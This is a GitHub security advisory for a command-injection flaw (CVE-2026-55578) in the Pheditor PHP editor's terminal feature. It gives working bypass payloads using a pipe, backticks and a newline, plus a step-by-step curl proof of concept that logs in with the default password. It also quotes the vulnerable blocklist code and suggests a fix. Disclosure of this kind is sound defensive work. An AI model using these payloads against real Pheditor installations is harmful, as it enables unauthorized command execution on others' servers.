# [H] Pheditor: Incomplete command sanitization in terminal feature allows RCE via pipe operator, backtick substitution, and newline injection

## Summary
Severity: High
Advisory: GHSA-wg4w-wr5q-6vjc
CVE: CVE-2026-55578
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-16
Source: https://github.com/advisories/GHSA-wg4w-wr5q-6vjc
Type: github-advisory

## Affected
- Packagist: `pheditor/pheditor` — affected >=2.0.1 <2.0.6

## Details
### Summary

The terminal feature in Pheditor uses an incomplete character blocklist to sanitize user-supplied commands before passing them to `shell_exec()`. After the fix for GHSA-9643-6xjp-vx57 (which added `$` to the blocklist), the characters `|` (single pipe), `` ` `` (backtick), and the newline byte (`0x0A`) remain unblocked. An authenticated user with the `terminal` permission (enabled by default) can leverage any of these to bypass the `TERMINAL_COMMANDS` allowlist and execute arbitrary OS commands as the web server user.

### Details

Tested repository: https://github.com/pheditor/pheditor

Tested commit: `e538f05b6faec99e5b23726bc9c17d6b57774297` (current HEAD on `main`)

Affected version: Pheditor 2.0.1+

The terminal handler receives `$_POST['command']` and passes it to `shell_exec()` at `pheditor.php:586`:

```php
$output = shell_exec((empty($dir) ? null : 'cd ' . escapeshellarg($dir) . ' && ') . $command . ' && echo \ ; pwd');
```

The blocklist at `pheditor.php:557` checks for `&`, `;`, `||`, and `$`, but does not block `|`, `` ` ``, or newline (`0x0A`):

```php
if (strpos($command, '&') !== false || strpos($command, ';') !== false || strpos($command, '||') !== false || strpos($command, '$') !== false) {
    echo json_error("Illegal character(s) in command (& ; ||)\n");
    exit;
}
```

The `TERMINAL_COMMANDS` prefix check at `pheditor.php:566-573` only validates that the command starts with an allowed name. All three bypasses start with a whitelisted command prefix.

**Bypass 1 — Single pipe `|`:**
The filter checks for `||` but not single `|`. Payload `ls | id` passes both the blocklist and the whitelist (starts with `ls`). The shell executes: `cd '<dir>' && ls | id && echo \ ; pwd`, running `id`.

**Bypass 2 — Backtick `` ` ``:**
Backtick is not in the blocklist. Payload `` echo `id` `` passes the blocklist and whitelist (starts with `echo`). The shell executes `id` inside backtick substitution.

**Bypass 3 — Newline `0x0A`:**
A literal newline byte is not in the blocklist. Payload `ls\ntouch /tmp/proof` (where `\n` is 0x0A) passes both checks. Only the first line is validated against the whitelist. The second line runs as an independent command.

### PoC

**Environment:** Any system running PHP 8.x with pheditor.php deployed and `shell_exec()` enabled.

**Setup:**
```bash
git clone https://github.com/pheditor/pheditor /tmp/pheditor-test
cd /tmp/pheditor-test
php -S localhost:8080 pheditor.php &
```

**Authenticate** (default password `admin`):
```bash
curl -s -c /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php -d "pheditor_password=admin" -L > /dev/null
TOKEN=$(curl -s -b /tmp/cookies.txt http://localhost:8080/pheditor.php | grep -o 'token = "[a-f0-9]*"' | grep -o '"[a-f0-9]*"' | tr -d '"')
```

**Bypass 1 (pipe `|`):**
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "command=ls | id" \
  --data-urlencode "dir="
```
Expected: `{"error":false,"message":"OK","result":"uid=... gid=...\n",...}` — `id` output proves RCE.

**Bypass 2 (backtick):**
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode 'command=echo `id`' \
  --data-urlencode "dir="
```
Expected: Same `id` output in response.

**Bypass 3 (newline 0x0A):**
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode $'command=ls\nid' \
  --data-urlencode "dir="
```
Expected: Same `id` output in response.

**Control (blocked command without bypass):**
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "command=whoami" \
  --data-urlencode "dir="
```
Expected: `{"error":true,"message":"Command not allowed..."}` — allowlist enforced.

**Cleanup:**
```bash
kill %1; rm -rf /tmp/pheditor-test /tmp/cookies.txt
```

### Impact

OS Command Injection (CWE-78). Any authenticated Pheditor user with the `terminal` permission (enabled by default) can bypass the `TERMINAL_COMMANDS` allowlist and execute arbitrary OS commands as the web server user. This is a bypass of the partial fix for GHSA-9643-6xjp-vx57 — that fix addressed `$()` substitution but three additional shell metacharacters remain unblocked.

**Attacker privileges:** Authenticated user (PR:L). Combined with default password `admin`, effectively PR:N.

**Impact:** Full read/write/execute access as the web server user. Confidentiality: High (read any accessible file). Integrity: High (write/delete files, deploy webshells). Availability: High (disrupt services).

**Suggested remediation:** Parse the command into executable + arguments, validate the executable against `TERMINAL_COMMANDS` with exact match, pass each argument through `escapeshellarg()`, or use `proc_open()` with an argument array to avoid shell interpretation entirely.

## References
- https://github.com/pheditor/pheditor/security/advisories/GHSA-wg4w-wr5q-6vjc
- https://github.com/pheditor/pheditor
- https://github.com/pheditor/pheditor/releases/tag/2.0.6
